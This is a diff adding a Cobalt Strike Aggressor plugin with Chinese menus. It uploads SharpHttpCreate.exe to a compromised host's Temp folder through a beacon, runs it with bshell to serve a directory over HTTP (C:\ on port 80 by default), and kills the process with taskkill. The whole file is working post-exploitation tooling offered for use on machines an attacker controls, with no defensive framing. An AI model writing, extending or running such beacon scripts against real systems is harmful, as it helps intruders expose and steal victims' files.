@@ -1,0 +1,45 @@
+menu "隧道代理"{
+	
+	menu "http服务"{
+		item "上传SharpHttpCreate.exe"{
+			$bid = $1;
+            $dialog = dialog("上传SharpHttpCreate.exe", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &Upload_SharpHttpCreate);
+            drow_text($dialog, "UploadPath",  "上传路径: "); 	
+            dbutton_action($dialog, "上传");
+            dialog_show($dialog);
+		}
+		sub Upload_SharpHttpCreate{
+			bcd($bid, $3['UploadPath']);
+			bupload($bid, script_resource("/scripts/TunnelProxy/SharpHttpCreate.exe"));
+		}
+		
+		
+		item "开启http服务"{
+			$bid = $1;
+			$dialog = dialog("开启http服务", %(path => "C:\\",port => "80",bid => $bid), &Exec_SharpHttpCreate);
+			dialog_description($dialog, "请填写http服务的目录以及端口");
+			drow_text($dialog, "path", "目录:  ");
+			drow_text($dialog, "port", "端口:  ");
+			dbutton_action($dialog, "开启");
+			dialog_show($dialog);
+		}
+		sub Exec_SharpHttpCreate{
+			$arg = join(' ',@('-p',$3['port'],'-d',$3['path']));
+			bshell($bid,"SharpHttpCreate.exe ".$arg);
+		}
+		
+		item "关闭http服务"{
+			$bid = $1;
+			bshell($bid,"taskkill /IM SharpHttpCreate.exe /F");
+		}
+		
+	
+	}
+	
+
+	
+	
+	
+	
+	
+}
